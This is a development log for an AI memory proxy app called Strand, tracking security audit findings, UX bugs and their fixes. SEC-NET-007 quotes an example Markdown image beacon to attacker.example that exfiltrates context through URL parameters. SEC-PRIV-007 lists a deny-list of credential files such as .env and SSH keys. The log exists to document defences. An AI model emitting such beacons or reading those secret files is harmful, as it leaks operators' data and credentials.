# Strand UX & Ergonomics Observations Log

This document tracks real-world friction points, visual bugs, design observations, and security/packaging findings captured during dogfooding sessions on ONYX.

---

## 1. Active Issues & Pre-Publishing Blockers (Triaged)

### `SEC-NET-007`: Remote Markdown Image Fetching & Network Egress (Audit F-01) — **Resolved**
* **Severity:** P0 (Critical / Data Exfiltration)
* **Component:** `src/strand/ui/qml/main.qml` (Chat delegates, `Text.MarkdownText`), `src/strand/ui/bridge.py`
* **Symptom:** The QML transcript renders assistant prose using `Text.MarkdownText` without an underlying `QNetworkAccessManager` restriction policy. A remote image reference (e.g., `![beacon](http://attacker.example/pixel.png?data=...)`) embedded in assistant text or fetched via a tool causes Qt Quick to trigger an immediate outbound HTTP GET over the network, leaking the operator's IP address and potentially exfiltrating context in URL query parameters.
* **Root Cause:** Default Qt Quick Markdown engine resolves and fetches remote image URLs automatically.
* **Resolution:** `bridge.neutralize_images` (`IMAGE_RE`) rewrites Markdown images in every non-code segment of `split_markdown`, so `segments` and `split_blocks` never hand Qt Quick `![...]` syntax: `![alt](url)` becomes `[image: alt]`, an empty alt becomes `[image]`, reference-style `![alt][ref]` is neutralized too, and the URL is dropped. Regular links and bold/code/list formatting are untouched; fenced code is already shown verbatim. Defense in depth: `app.install_egress_guard` installs a `QQmlNetworkAccessManagerFactory` whose manager rewrites any request not using `file`/`qrc`/`data` to an unroutable URL. Tests: `tests/test_ui.py`.

### `SEC-PRIV-007`: Outbound Secret Redaction & Workspace Tool File Deny-List (Audit F-02) — **Resolved**
* **Severity:** P1 (High / Egress Leak)
* **Component:** `src/strand/proxy.py`, `src/strand/tools/workspace.py` (`read_file`), `src/strand/config.py`
* **Symptom:** High-entropy sanitization executes only on the *inbound storage* path (prior to writing to `memory.db`). Text sent upstream to cloud LLMs (raw user prompts and tool outputs such as `read_file(".../.env")`) is dispatched completely unredacted. Furthermore, the `redact_secrets` setting in GUI/config is never read by the proxy or tool dispatcher.
* **Root Cause:** Absence of egress filtering on tool outputs and lack of sensitive-file path guards inside declared workspace roots.
* **Resolution:** `tools/workspace.py` adds `is_denied_file` (case-insensitive): `.env*`, `*.pem`, `*.key`, `*.pkcs12`, `*.pfx`, `id_rsa*`, `id_ed25519*`, `id_ecdsa*`, `id_dsa*`, `*token*`, `*credential*`, `*secret*` and `.git/config`. `read_file` checks both the requested and resolved path and returns `{"error": "Access denied: sensitive file policy", "message": ...}` without reading the file. `proxy._run_tool_call` passes every tool result through `sanitize_text` before it becomes the `role: "tool"` message, gated by the new `Config.redact_secrets` (default `True`, read from the `config.json` key the GUI already writes). Scope: tool outputs only; raw user prompts are not redacted. No schema change. Tests: `tests/test_proxy_tools.py`.

### `SEC-MEM-008`: Unbounded Assistant JSON Summary Ingestion (Audit F-04) — **Resolved**
* **Severity:** P1 (High / Storage Invariant)
* **Component:** `src/strand/distill.py` (`_upsert`), `src/strand/db.py` (`record_episode`)
* **Symptom:** While the heuristic regex distillation path enforces `MAX_SUMMARY_LEN = 300`, the assistant JSON-block distillation path accepts raw summaries of arbitrary length. A 50,000-character string returned by a model in a summary field is stored verbatim in `entities.summary` and `episodes.narrative`, violating the invariant that raw text blobs never enter `memory.db`.
* **Root Cause:** Missing length truncation inside `DistillationEngine._upsert` and `db.record_episode`.
* **Resolution:** `DistillationEngine._upsert` strips and clamps every summary to `MAX_SUMMARY_LEN` (300) before dedup, merge and `db.upsert_entity`. `db.record_episode` clamps narratives to the new `common.MAX_NARRATIVE_LEN` (600). No schema change. Test: `test_json_block_summary_and_narrative_are_clamped` in `tests/test_distill.py`.

### `SEC-PRIV-008`: Host Telemetry Dynamic Preference Provenance Guard (Audit F-05) — **Resolved**
* **Severity:** P1 (High / Privilege Escalation)
* **Component:** `src/strand/onboarding.py` (`telemetry_preference`), `src/strand/proxy.py` (`_apply_telemetry_choice`)
* **Symptom:** `telemetry_preference()` matches any `person` entity with a `prefers` edge targeting "Host Telemetry Enabled" without verifying provenance or confidence. A low-confidence `model_inferred` edge (0.6) resulting from model hallucination or third-party text can toggle hardware telemetry and cause `enable_host_telemetry=true` to be permanently written to `config.json`.
* **Root Cause:** Missing origin and confidence checks when checking onboarding preferences.
* **Resolution Plan:**
  * Require `edge.origin == "user_explicit"` and `edge.confidence >= 1.0` in `telemetry_preference()`.
  * Validate that the edge source matches the specific, authenticated operator entity.
  * Add a test confirming that a `model_inferred` telemetry edge is rejected and does not update `config.json`.
* **Resolution:** `telemetry_preference()` now requires the edge to be `user_explicit` with confidence >= 1.0 and its source to be an authenticated operator anchor (`person`, `user_explicit`, confidence >= 1.0); `model_inferred` edges never enable telemetry. No schema change. Tests: `tests/test_onboarding.py`.

### `ERG-CTX-005`: Multi-Turn Context Persistence & Token Optimization (Audit F-26) — **Resolved**
* **Severity:** P1 (Medium-High / Continuity Loss)
* **Component:** `src/strand/proxy.py`, `src/strand/session.py` (`SessionLedger`)
* **Symptom:** Context deltas are injected into the outgoing system prompt envelope, and `SessionLedger` marks those entity IDs as seen. However, client transcripts (GUI, CLI, third-party clients) store only `user` and `assistant` messages, omitting Strand's system message. On Turn 2, the client sends its history without the delta, and `SessionLedger` skips re-injecting them because they are marked "seen". As a result, the model's active attention window completely loses working memory on Turn 2+.
* **Root Cause:** SessionLedger assumes the client preserves the upstream system prompt containing the delta across conversation turns.
* **Resolution:** `SessionLedger.remember_context` stores every injected block (capped at 12000 chars; the oldest blocks are dropped and un-seen). `proxy.py` compares the client's system/developer text against the stored blocks and replays any that are missing, oldest first, in front of the new delta. A client that echoes our prompt is not duplicated. Evicting a forgotten entity also drops its blocks. Tests: `tests/test_proxy.py`.
* **Original Plan:**
  * Inspect incoming messages: if the system message lacks the active session preamble, or on a periodic turn cadence, replay the active working memory delta.
  * Document the client-server context contract clearly in `ARCHITECTURE.md` and `README.md`.
  * Add a multi-turn conversation test asserting that working memory context remains accessible across turns.

### `SEC-PERM-002`: Logging Directory `chmod 0700` Scoping (Audit F-07) — **Resolved**
* **Severity:** P2 (Medium / POSIX Invariant)
* **Component:** `src/strand/logging.py` (`setup_logging`)
* **Symptom:** While `db.py`, `daemon.py`, and `config.py` use `perms.secure_parent_dir()` to restrict `0700` enforcement strictly to Strand-managed folders, `setup_logging` calls `_chmod_quiet(log_path.parent, 0o700)` unscoped. If an operator configures `STRAND_LOG_PATH=~/strand.log`, Strand chmods the entire `$HOME` directory to `0700`.
* **Root Cause:** Failure to adopt `perms.secure_parent_dir()` during the initial POSIX hardening pass.
* **Resolution Plan:**
  * Replace the direct `_chmod_quiet` call in `setup_logging` with `perms.secure_parent_dir(log_path.parent)`.
  * Add a test confirming that initializing logging in a non-Strand directory does not mutate parent directory permissions.
* **Resolution:** `setup_logging` now calls `perms.secure_parent_dir(log_path.parent)` (local import, since `perms` imports `strand.logging`). Only managed `strand` directories are tightened to `0700`; `$HOME`, `/tmp` and other unmanaged parents keep their mode (warning logged) and the log file stays `0600`. Tests: `tests/test_perms.py`.

### `SEC-UI-009`: Dead UI Governance Checkboxes (Audit F-08) — **Resolved**
* **Severity:** P2 (Medium / UI Truthfulness)
* **Component:** `src/strand/ui/qml/main.qml`, `src/strand/ui/bridge.py`
* **Symptom:** The Settings modal displays checkboxes for "Thread Secret Redaction" (`redact_secrets`) and "Fail-Closed Private" (`fail_closed_private`). While toggling them writes boolean keys to `config.json`, the daemon proxy completely ignores `fail_closed_private` (privacy is always hardcoded fail-closed), and ignores `redact_secrets` on outbound traffic. Unchecking the box displays a false warning that "Private strands will be transmitted".
* **Root Cause:** Front-end configuration controls shipped ahead of backend enforcement wiring.
* **Resolution Plan:**
  * Remove `fail_closed_private` from the UI (enforce fail-closed privacy unconditionally as an immutable bedrock invariant).
  * Connect `redact_secrets` to the outbound tool filter (see `SEC-PRIV-007`) or remove the toggle until backend outbound redaction is completed.
* **Resolution:** the `fail_closed_private` checkbox, its consequence label and its bridge key were removed (fail-closed privacy is an immutable invariant); `redact_secrets` and the decay selector map to live config keys. Tests: `tests/test_ui.py`.

### `SEC-MEM-009`: Episodic Residue Retention on Entity Drop (Audit F-09) — **Resolved**
* **Severity:** P2 (Medium / Privacy Hygiene)
* **Component:** `src/strand/db.py` (`drop_entity`)
* **Symptom:** Invoking `drop_entity` deletes the entity row, connecting edges, and vector embeddings, but leaves past `episodes.narrative` rows intact with references to the deleted entity and its raw ID in `extracted_entities`. Future compaction passes can re-read these narratives and resurrect summaries of "forgotten" entities.
* **Root Cause:** Soft-delete and entity drops do not scrub episodic conversation history.
* **Resolution:** `drop_entity` strips the id from `episodes.extracted_entities`, deletes episodes that referenced only that entity, and replaces the entity's name and aliases in remaining narratives with `[forgotten]`, in the same transaction. No schema change. `scrub_episodes=False` is used by the generic-User merge, which is not a forget. Tests: `tests/test_forgetting.py`.
* **Original Plan:**
  * When an entity is explicitly dropped, tombstone or scrub narrative mentions referencing that entity ID in `episodes`, or delete orphaned episodic history.
  * Add a test verifying that dropping an entity scrubs or decouples associated episode records.

### `SEC-MEM-010`: Compactor Summary Overwrite of Private Entities (Audit F-11) — **Resolved**
* **Severity:** P2 (Medium / Data Integrity)
* **Component:** `src/strand/compactor.py`, `src/strand/db.py` (`update_entity_summary`)
* **Symptom:** While `SessionCompactor._apply_aliases` checks `is_private()` before merging, `compactor.py`'s entity summary update loop does not check entity privacy before calling `db.update_entity_summary()`. A background compaction run can overwrite a private entity's summary text.
* **Root Cause:** Inconsistent private entity checks across compaction write branches.
* **Resolution:** `SessionCompactor` skips private entities (via `is_private`) in both the entity-summary loop and the operator focus summary. As defence in depth, `db.update_entity_summary` refuses (returns False) when any entity matching the name is private. Test: `test_compaction_never_overwrites_private_entity_summaries` in `tests/test_compactor.py`.

### `ERG-IO-006`: Single-Line Large File Memory Spikes in Workspace Tool (Audit F-13) — **Resolved**
* **Severity:** P2 (Medium / Denial of Service)
* **Component:** `src/strand/tools/workspace.py` (`read_file`)
* **Symptom:** In `read_file`, iterating lines via `for raw in fh:` causes Python to buffer the entire line before applying the 8 KiB read window. Reading a 512 MB file without newlines (such as a minified bundle, large JSON, or binary-ish asset) drives process memory from 77 MB to over 1 GB RSS.
* **Root Cause:** Line-buffering occurs before the byte slice cap is evaluated.
* **Resolution:** `read_file` reads with `fh.readline(MAX_READ_BYTES + 1)` so no more than 8 KiB + 1 byte of any line is buffered; over-long lines before `offset` are skipped in bounded chunks. Tests: `test_single_line_megabyte_file_is_read_with_bounded_buffer`, `test_read_file_never_requests_more_than_cap_per_readline` in `tests/test_tools.py`.

### `SEC-NET-008`: URL Credential Leakage in HTTP Exceptions (Audit F-14) — **Resolved**
* **Severity:** P2 (Medium / Secret Redaction)
* **Component:** `src/strand/proxy.py`, `src/strand/extractors.py`, `src/strand/compactor.py`
* **Symptom:** When upstream HTTP calls fail, string representations of `httpx.HTTPStatusError` or `httpx.RequestError` embed the complete URL, including basic-auth credentials (e.g., `https://user:password@proxy...`), which are logged to `cortext.log` or returned in `repr(exc)` to the client.
* **Root Cause:** Logging raw exception objects without sanitizing embedded URL structures.
* **Resolution:** `common.safe_exc` renders `Type: message` with every embedded URL passed through `common.mask_url` (moved from `cli`, re-imported there). `proxy.py`, `extractors.py` and `compactor.py` use it for logs and the 502/stream error messages. Tests: `tests/test_proxy.py`, `tests/test_extractors.py`.

### `SEC-PRIV-009`: Absence of CLI/UI "Mark Private" Command (Audit F-17) — **Resolved**
* **Severity:** P2 (Medium / Feature Completeness)
* **Component:** `src/strand/cli.py`, `src/strand/ui/`
* **Symptom:** While the fail-closed egress architecture rigorously protects entities marked `archetype='private'` or `metadata["private"]=True`, there is no CLI command or UI action to mark an existing entity private. Operators must manually edit SQLite tables to protect nodes.
* **Root Cause:** Missing write pathway for privacy classification.
* **Resolution Plan:**
  * Implement `strand mark-private <entity_id_or_name>` in `src/strand/cli.py`.
  * Add a corresponding test verifying that marking an entity private updates its metadata and hides it from public resolution.
* **Resolution:** `strand mark-private <name|id>` sets `metadata["private"] = true` via the new `db.update_entity_metadata`; unknown targets exit 1. No schema change. Tests: `tests/test_cli.py`.

### `PERF-RES-001`: In-Process Cache for Per-Request Full Table Scans (Audit F-24) — **Resolved**
* **Severity:** P2 (Medium / Performance Scaling)
* **Component:** `src/strand/resolver.py` (`match_entities`, `_private_ids`), `src/strand/db.py`
* **Symptom:** Every incoming request executes a full `SELECT * FROM entities` table scan plus Python-side regex and alias parsing directly on the asyncio event loop. At 5,000 entities, resolution latency reaches ~579 ms median per request, blocking all concurrent traffic on the daemon.
* **Root Cause:** Lack of an in-memory entity lookup index or background caching layer.
* **Resolution:** `DatabaseManager.write_version` is a monotonic counter bumped whenever a `transaction()` ends (all entity, alias, edge and delete paths, including CLI and distill writes); only pure bookkeeping (`touch_access`, `record_episode`, `mark_episodes_compacted`) opts out with `graph=False`. `ContextResolver` caches an immutable snapshot (rows, precomputed casefolded name/alias terms and tokens, private id set) keyed by `(write_version, PRAGMA data_version)`; the second key makes writes from another process (e.g. `strand mark-private`) invalidate it too. On a hit no `entities` scan happens. Private ids come from a direct `PRIVATE_ENTITY_SQL` query (the Python `is_private` loop is gone from the resolver's matching path), and the exact/token matching plus snapshot build run in `asyncio.to_thread`. `allow_private=False` reads a pre-filtered public view of the snapshot, so a cached private entity never leaks; marking private or dropping invalidates on the next request. With `decay_enabled` the snapshot is rebuilt per request (access columns change on every recall). No schema change. Tests: `tests/test_resolver.py`.

### `SEC-LOG-005`: Query Text Content Logging at INFO Level (Audit F-29) — **Resolved**
* **Severity:** P2 (Low-Medium / Log Hygiene)
* **Component:** `src/strand/proxy.py`
* **Symptom:** The proxy logs an 80-character preview of every incoming query at `INFO` level. While the string is sanitized against high-entropy patterns, plain-English user prompts still appear in production systemd journals (`journalctl --user -u strand`), creating privacy risks when users share debug logs.
* **Root Cause:** Retaining content previews at standard operational log levels.
* **Resolution:** `INFO` logs `Incoming query length=%d session=%r`; the sanitized 80-character preview is `DEBUG` only. Tests: `tests/test_config_logging.py`, `tests/test_final_hardening.py`.

### `OBS-POL-010`: Conditional Bedrock (C3), `persona_prompt` Suppression (C1) & Prompt Centralization (R1, R2) — **Resolved**
* **Component:** `src/strand/prompts.py` (new), `src/strand/common.py`, `src/strand/resolver.py`
* **Resolution:** `BEDROCK_INVARIANT` moved to the new stdlib-only `prompts.py` (single source of truth for prompt contracts) and rewritten as a positive peer-level register (conversational cadence, prose over lists, task discipline); `common.py` re-exports it, so existing imports keep working. `ContextResolver.resolve` no longer gates the Bedrock on `stance or anchor`: it is queued on Turn 1 of every session, including fresh installs with an empty personality graph and no `persona_prompt`. `config.persona_prompt` is no longer suppressed when learned `trait`/`directive`/`preference` nodes exist; it stays as the baseline anchor at the top of `[Persona Stance]`. Side effects: the first resolve of a session is never `""`, and the proxy log `traits=` count includes the anchor line. Tests updated to the new text and behavior, plus new tests for Bedrock with an empty graph and with `format_context_delta` given no personality entities. No schema change; `SessionLedger` and `session.py` untouched. 795 tests pass with `-W error`.

### `OBS-POL-012`: Conversational Volley & Pacing Calibration of `BEDROCK_INVARIANT` — **Resolved**
* **Component:** `src/strand/prompts.py`
* **Symptom:** The prior "concise, rhythmic prose paragraphs" wording still let the model answer open-ended questions with one monolithic essay.
* **Resolution:** `BEDROCK_INVARIANT` now directs a back-and-forth cadence for open-ended discussion: a concise high-level take (1–2 short paragraphs) on the primary trade-offs, then a check of the operator's direction before deep specs or exhaustive lists. Lists/tables stay reserved for code, commands and spec sheets, and imperative tool/technical tasks keep Task-Yield (state the result plainly and stop). Existing tests reference the constant symbolically, so no assertions changed. No schema change.

### `OBS-POL-011`: Bedrock Eviction Vulnerability in `SessionLedger` (Audit R1) — **Resolved**
* **Component:** `src/strand/session.py`, `src/strand/resolver.py`
* **Symptom:** When stored context blocks exceeded `MAX_REPLAY_CHARS` (12000), the oldest block, Turn 1 carrying `BEDROCK_ID` and `BEDROCK_INVARIANT`, was popped and un-seen, so the model lost its peer stance mid-conversation (and the Bedrock was re-queued as new).
* **Resolution:** `remember_context` now evicts the oldest block that does not contain `BEDROCK_ID`; the Bedrock block is pinned and the newest block is always kept. `BEDROCK_ID` moved to `session.py` (re-imported by `resolver.py`) to avoid a circular import. Intermediate factual blocks are still shed and un-seen. No schema change. Test: `test_bedrock_block_is_pinned_while_intermediate_blocks_are_evicted` in `tests/test_resolver_session.py`. 796 tests pass with `-W error`.

### `OBS-POL-005`: Dynamic Persona Refinement & Long-Term Compaction (Phase 2)
* **Component:** `src/strand/proxy.py`, `distill.py`, `compactor.py`
* **Status:** Phase 1 complete (bedrock anchor, dynamic graph precedence, critique deprecation with permanence markers).
* **Open Scope:** Phase 2 multi-episode compaction loop. Periodic synthesis should analyze multi-week conversational patterns, refine the operator profile, and gracefully decay inactive behavioral quirks.

---

## 2. Resolved Observations & Regressions

### `SEC-LOG-004`: Cleartext Entity and Deprecation Leaks at INFO Verbosity — **Resolved**
* **Component:** `src/strand/distill.py`, `src/strand/db.py`
* **Resolution:** Demoted entity-level extraction traces, alias merging, and deprecation rationales to `logger.debug()`. Production `INFO` logs record only aggregate operational counts and session identifiers.

### `SEC-NET-006`: Unauthenticated Non-Loopback TCP Startup — **Resolved**
* **Component:** `src/strand/daemon.py` (`enforce_bind_policy`)
* **Resolution:** The daemon refuses to bind to non-loopback TCP interfaces without an API key by default, exiting cleanly with a security error unless overridden by `--insecure-allow-unauthenticated` or `STRAND_INSECURE_ALLOW_UNAUTHENTICATED=1`.

### `BUG-CLI-007`: Unhandled Traceback on Corrupt Node Metadata — **Resolved**
* **Component:** `src/strand/cli.py` (`cmd_inspect`)
* **Resolution:** Replaced raw `json.loads` with `common.load_metadata`, rendering a clean `metadata: {corrupted}` fallback without raising unhandled exceptions.

### `SEC-CLI-005`: Plaintext Embedded Credentials in Diagnostic Commands — **Resolved**
* **Component:** `src/strand/cli.py` (`mask_url`)
* **Resolution:** Diagnostic commands parse URLs with `urllib.parse.urlsplit` and mask embedded HTTP basic authentication credentials (e.g., `https://user:••••••••@host/v1`).

### `SEC-CONF-008`: Short Secret Masking Information Leak — **Resolved**
* **Component:** `src/strand/config.py` (`mask_secret`)
* **Resolution:** Credentials under 16 characters are completely masked (`********`) without retaining head or tail character slices.

### `PUB-SAN-001`: Repository, Identity & Environment Sanitization Sweep — **Resolved**
* **Component:** `src/strand/`, `tests/`, `packaging/systemd/strand.service`, docs
* **Resolution:** Operator-specific names, homelab hostnames, personal paths, and vehicle fixtures replaced with neutral test anchors (Alice, Bob, workstation-01, Kestrel). `strand.service` updated to use `/usr/bin/env python3 -m strand.daemon` and `%h` specifiers.

### `SEC-PERM-001`: Indiscriminate Parent Directory `chmod 0700` — **Resolved**
* **Component:** `src/strand/db.py`, `daemon.py`, `config.py`
* **Resolution:** Added `perms.py` with `secure_parent_dir()`. Permissions are tightened strictly on directories named `strand` (and not `$HOME`). Unmanaged parents retain existing permissions with a warning emitted, while leaf files and sockets enforce `0600`.

### `SEC-PRIV-003`: Resolver Internal API Default Parameter Boundary — **Resolved**
* **Component:** `src/strand/resolver.py`
* **Resolution:** Every resolver entry point defaults to `allow_private=False` (fail-closed). Tests verify that omitting the parameter hides private entities and connecting edges by default.

### `SEC-PRIV-002`: Day-Zero Host Hardware Fingerprinting — **Resolved**
* **Component:** `src/strand/proxy.py`, `host.py`, `config.py`, `session.py`, `ui/bridge.py`
* **Resolution:** `Config.enable_host_telemetry` defaults to `False`. When disabled, hardware specs are stripped from ambient context, retaining only the hostname for topological anchoring unless opted into via settings or headers.

### `SEC-CACHE-003`: Shared `/tmp/fastembed_cache` Isolation — **Resolved**
* **Component:** `src/strand/embed.py` (`EmbeddingManager`), `packaging/systemd/strand.service`
* **Resolution:** FastEmbed ONNX weights are routed to `~/.cache/strand/fastembed` with explicit `0700` POSIX permissions, isolated from shared temporary directories.

### `ERG-PATH-004`: Relative Path Sandbox Resolution Under `systemd --user` — **Resolved**
* **Component:** `src/strand/tools/workspace.py` (`is_safe_path`)
* **Resolution:** Relative paths are evaluated across all configured directories in `workspace_roots` in addition to `os.getcwd()`, preventing false-positive 403 errors when running as a systemd user unit.

### `BUG-UI-001`: Input Dock Premature Wrap & Row-Height Jitter — **Resolved**
* **Component:** `src/strand/ui/qml/main.qml`
* **Resolution:** Collapsed `messageInput.rightPadding` to `14px` when text is present. Stabilized dock width to a centered container with smooth expansion.

### `OBS-UI-002`: Transcript Presentation (Unboxed Text vs. Cards) — **Resolved**
* **Component:** `src/strand/ui/qml/main.qml`, `bridge.py`
* **Resolution:** Conversational text wraps into adaptive assistant bubbles (#13171f), while code blocks and tables expand into full technical slate cards (#0c0f14) with identity headers and variable turn spacing.
* **Semantic intra-turn spacing:** `split_blocks` tags prose paragraphs ending in `?` as `is_pivot`. Continuous prose stays tight (8px), the pivot volley handing the turn back gets ~18px of breathing room, and transitions to/from technical cards use 14px; speaker-change gutter stays 30px. Bubble padding softened to 16px/12px.

### `OBS-ERG-003`: Stream Throughput Pacing & Grounding Transparency — **Resolved**
* **Component:** `src/strand/ui/bridge.py` & `main.qml`
* **Resolution:** Client-side token pacing implemented at ~67 tokens/sec with instant Tab-key flush. Added the `X-Strand-Grounding` ~150 ms header pip pulse to visually signify memory retrieval before stream rendering begins.

### `OBS-UI-006`: Diagnostics Slide-Out Legibility & Canvas Interference — **Resolved**
* **Component:** `src/strand/ui/qml/main.qml` (`telemetryDrawer`)
* **Resolution:** Retitled drawer header to "TELEMETRY", increased background fill opacity to 0.96 (#0d1117) to eliminate text bleed-through, and resolved margin collisions.

### `OBS-POL-004` & `OBS-POL-006`: Operator Identity Stance & Day Zero Anchoring — **Resolved**
* **Component:** `src/strand/extractors.py`, `proxy.py`, `onboarding.py`
* **Resolution:** Removed procedural regex name heuristics. Turn 1 prompts naturally without assuming `$USER`. Model B semantically identifies the operator name, tags it as `person` / `user_explicit` / `1.0`, binds the `operates_host` edge, and merges the generic User node and its edges into the operator.

### `OBS-MEM-006`: False Edge Deprecations on Historical Items — **Resolved**
* **Component:** `src/strand/extractors.py`, `resolver.py`, `db.py`
* **Resolution:** Distillation instructions preserve chronological statements (e.g., prior vehicle ownership) as active `previously_owned` edges instead of marking them as deprecated. User first-person assertions receive `user_explicit` / `1.0` provenance, and archetype collection queries traverse active history edges.

### `OBS-SVC-007`: False-Positive Startup Reports & Static-Only Doctor — **Resolved**
* **Component:** `src/strand/daemon.py`, `src/strand/cli.py`, `scripts/install.sh`, `packaging/systemd/strand.service`
* **Resolution:** The unit is now `Type=notify`; the daemon sends `READY=1` after the socket is listening and migrations are done. The installer polls `is-active` and dumps the last 15 journal lines (exit 1) on failure. `strand doctor` actively probes `GET /health` on the daemon socket (0.5s) and exits 1 when unreachable.

### `WS-MUT-002`: Ring 1 Safe File Mutation Verification — **Resolved**
* **Component:** `src/strand/tools/workspace.py` (`grep_workspace`, `write_file`, `patch_file`, `restore_backup`)
* **Resolution:** Verified offline: grep honors the 20-match / 4 KB caps and the root sandbox; writes outside roots, into `~/.config/strand/`, or to `.env*` / `*.key` / `id_rsa*` fail with `access_denied`; ambiguous or missing patch blocks leave the disk and journal untouched; snapshots are `0600` in a `0700` directory; `restore_backup` reverts (and can redo) a mutation and refuses targets outside the roots; dirty git files are refused. Limitation: the ripgrep code path is covered by tests only on hosts with `rg` installed (skipped otherwise); the Python fallback is always tested.

### `OBS-ONB-008`: Eager Golden Retriever & Cross-Session Onboarding Amnesia — **Resolved**
* **Component:** `src/strand/onboarding.py`, `src/strand/proxy.py`
* **Resolution:** The onboarding persona kept asking conversational questions after imperative tasks, and every new session on an already-onboarded database could re-trigger Day Zero. Added `is_onboarding_completed(db)` (explicit operator AND resolved telemetry preference) as a permanent graduation gate: without `X-Strand-Mode: onboarding` such sessions get no directive and no onboarding flag. The directive now carries a Task-Yield constraint and a default question budget of 0, and an affirmative telemetry answer gets a one-sentence hostname/RAM/cores acknowledgement, then yields. No schema change.

### `WS-LIFE-004`: Workspace File Lifecycle Verification — **Resolved**
* **Component:** `src/strand/tools/workspace.py` (`make_directory`, `move_file`, `remove_file`, `write_file`, `restore_backup`)
* **Resolution:** Verified offline: nested `write_file` creates parents; `make_directory` is idempotent and denies paths outside roots or in `~/.config/strand/`; `move_file` refuses overwrites, deny-listed names, outside paths and dirty git files, and `restore_backup` moves it back (redo moves it forward); `remove_file` journals a `0600` snapshot, refuses `.git/`, `.env*`, root directories and `memory.db`, and `restore_backup` revives the file with its original mode. Limitation: only regular files are removable; directory deletion is intentionally unsupported. 770 tests pass with `-W error`.

### `WS-IMG-005`: Headless Media Inspection & Ephemeral Eviction Verification (Phase 8B) — **Resolved**
* **Component:** `src/strand/tools/workspace.py` (`read_image`, `read_file`), `src/strand/proxy.py` (`_run_tool_call_full`), `src/strand/session.py` (`compact_history`), `src/strand/distill.py` (`process_exchange`)
* **Resolution:** Verified offline: `read_image` encodes valid images inside the roots as data URIs and fails closed on out-of-root paths, `.env*`-style names, unsupported extensions, mismatched content and files over 10 MB; `read_file` returns `binary_file` for images and PDFs. The upstream turn receives the image as an `image_url` block; on the next turn only an `[Image: path inspected (mime, N KB)]` stub is sent. A data URI in a distilled exchange is stripped before Model B, and `memory.db` dumps contain no base64. Limitation: the multimodal block uses the OpenAI-compatible shape; upstreams without vision support will ignore or reject it. 776 tests pass with `-W error`.

### `WS-INFO-006`: Workspace Metadata Inspection Verification — **Resolved**
* **Component:** `src/strand/tools/workspace.py` (`get_file_info`)
* **Resolution:** Verified offline: regular files report size, octal mode (`0644`/`0755`), UTC ISO mtime and newline count; directories, binary files (NUL sniff or binary extension) and files over 2 MB report `line_count=None`; paths outside roots, `.env*`, `.git/` and `~/.config/strand/memory.db` fail with `access_denied`; missing paths return `not_found`. No file body is returned. Limitation: `line_count` counts `\n` bytes, so a final unterminated line is not counted. 779 tests pass with `-W error`.

### `WS-BATCH-007`: Batched File Reading Verification — **Resolved**
* **Component:** `src/strand/tools/workspace.py` (`read_multiple_files`)
* **Resolution:** Verified offline: valid files return content and line counts in `files`; a mixed batch returns the valid file while missing (`not_found`), `.env` (`access_denied`), `.png`/NUL-byte (`binary_file`), oversized (`file_too_large`) and out-of-root (`access_denied`) paths land in `errors`; 11 paths return `batch_too_large`. Bodies are ephemeral and never written to `memory.db`. Limitation: `lines` uses `str.splitlines()`, so a final unterminated line counts. 782 tests pass with `-W error`.

### `WS-GLOB-008`: Pattern Search Verification — **Resolved**
* **Component:** `src/strand/tools/workspace.py` (`glob_files`)
* **Resolution:** Verified offline: `**/*.txt` and `test_*.py` return sorted matches with correct counts; 230 files are cut at 200 with `truncated: true` (exactly 200 is not truncated); `.git/`, `.env*`, symlinks escaping the roots and Strand config files never appear in matches; bases outside the roots, in `.git` or `~/.config/strand` fail with `access_denied`; missing bases return `not_found`; empty, non-string or absolute patterns return `invalid_arguments`. Limitation: only regular files are returned (directories are skipped), and the walk is lazy but unindexed, so a very broad `**` over a huge tree is bounded only by the 200-match cap.

### `OBS-ONB-009`: Conversational Onboarding Fully Deprecated in Favor of Deterministic Setup Plates — **Resolved**
* **Component:** `src/strand/onboarding.py`, `src/strand/proxy.py`, `src/strand/extractors.py`, `src/strand/ui/bridge.py`, `src/strand/ui/qml/main.qml`
* **Resolution:** The 4-plate setup wizard now deterministically configures the engine, anchors the operator entity and `operates_host` edge in SQLite, sets the telemetry choice and configures the workspace roots, so the conversational intake is obsolete. Removed `onboarding_directive()` (Day Zero turns, name-asking opening line, mission text, in-chat telemetry gate, Intent Triage), `is_onboarding_completed`, the proxy's in-memory onboarding session tracking and conversational telemetry application, the `/onboard` command with its `X-Strand-Mode: onboarding` header and trigger turn, and Model B's special-case operator-name instructions ("Call me X", "Just X"). A fresh session now loads regular context deltas and the `BEDROCK_INVARIANT` only. Retained: `seed_operator_anchor`, `count_operators`, `reanchor_generic_user`, `telemetry_preference`. This supersedes the Day Zero and graduation behavior recorded under `OBS-ONB-008` and earlier. No schema change.

### `OBS-POL-013`: Model B Extractor Prompt Tiered Into Schema, Rules and Examples (Audit R5) — **Resolved**
* **Component:** `src/strand/prompts.py`, `src/strand/extractors.py`, `src/strand/common.py`
* **Resolution:** The 5.2 KB extractor literal (about 19 stacked negations) moved to `prompts.py` as `EXTRACTOR_SYSTEM_PROMPT` (about 3.1 KB, 425 words, roughly 40% smaller) in three tiers: a strict JSON contract, four positive rules (A facts vs. interaction rules, B permanence and critiques, C history vs. invalidation, D forgetting) and three worked triples. The permanence-vs-critique ambiguity is resolved: a direct critique ("actually, stop using diffs") has the same effect as an explicit permanence marker, emitting the new edge plus a `deprecated_edges` entry for the old rule, while transient steering is ignored. Container-noun and telemetry-provenance prose was dropped because `collapse_containers` and `onboarding.telemetry_preference` enforce them in Python. `PERSONALITY_ARCHETYPES` / `FACTUAL_ARCHETYPES` now live in `prompts.py` (re-exported by `common.py`); `extractors.SYSTEM_PROMPT` stays as an alias. Five prompt-text assertions in `tests/test_extractors.py` were updated to the new contract (removed prose is now asserted absent); no behavior tests changed. No schema change. 797 tests pass with `-W error`.
